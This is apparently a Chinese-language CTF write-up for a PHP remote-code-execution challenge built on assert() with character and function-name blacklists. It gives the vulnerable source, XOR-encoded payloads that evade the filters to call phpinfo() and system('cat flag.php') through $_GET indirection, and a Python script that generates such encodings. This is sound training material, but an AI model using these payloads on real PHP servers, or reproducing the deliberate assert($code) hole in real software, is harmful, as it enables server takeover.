题型:RCE
漏洞原因:assert($code)
&lt;?php
error_reporting(0);
if(!isset($_GET[&#039;code&#039;])){
    highlight_file(__FILE__);
}else{
    $code = $_GET[&#039;code&#039;];
    if (preg_match(&#039;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#039;|\`|\||\[|\]|\_|=)/i&#039;,$code)) { 
        die(&#039;You are too good for me&#039;); 
    }
    $blacklist = get_defined_functions()[&#039;internal&#039;];
    foreach ($blacklist as $blackitem) { 
        if (preg_match (&#039;/&#039; . $blackitem . &#039;/im&#039;, $code)) { 
            die(&#039;You deserve better&#039;); 
        } 
    }
    assert($code);
}
第一个判断过滤了特定字符:f l a g . p h / ; ” ’ ` | [ ] _ =
第二个判断过滤了php内置所有已定义的函数
get_defined_functions() 函数返回一个关联数组，其中包含了所有已定义的函数。这个数组包括内部函数、用户自定义函数以及其他扩展或库中的函数。

解决方法-异或绕过
同时 结合格式为
%80^%f0=p
%80^%e8=h
%80^%f0=p
%80^%e9=i
%80^%ee=n
%80^%e6=f
%80^%ef=o
%80^%a8=(
%80^%a9=)
=&gt;%80%80%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef%a8%a9
绕过的方式：
&lt;!-- 该漏洞是由于assert()函数形成 --&gt;

&lt;!-- 执行函数可行方案 --&gt;
(&#039;phpinfo&#039;)()
(%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef)()

${phpinfo()}
${%80%80%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef%a8%a9}

$_GET{e}()&amp;e=phpinfo
${%80%80%80%80^%DF%C7%C5%D4}{e}()&amp;e=phpinfo
&lt;!-- 执行函数不可行方案 --&gt;
(&#039;phpinfo()&#039;)
(%80%80%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef%a8%a9)不可行

$_GET{e}&amp;e=phpinfo()
${%80%80%80%80^%DF%C7%C5%D4}{e}&amp;e=phpinfo()不可行
&lt;!-- 执行命令 --&gt;
${%80%80%80%80^%DF%C7%C5%D4}{e}&amp;e=system
&lt;!-- 构造payload --&gt;
system cat flag.php
=&gt;
$_GET{e}($_GET{v})&amp;e=system&amp;v=cat flag.php
=&gt;
${%80%80%80%80^%DF%C7%C5%D4}{e}(${%80%80%80%80^%DF%C7%C5%D4}{v})&amp;e=system&amp;v=cat%20flag.php
paylode=input(&quot;输入:&quot;)
output_i=[]
output_j=[]
for l in range(len(paylode)):
    flag=False
    for i in range(128,256):
        if flag:
            continue
        for j in range(128,256):
            if(i^j==ord(paylode[l])):
                output_i.append(hex(i))
                output_j.append(hex(j))
                flag=True
                continue

output=&#039;&#039;.join(output_i)+&quot;^&quot;+&#039;&#039;.join(output_j)
output=output.replace(&#039;0x&#039;,&#039;%&#039;)
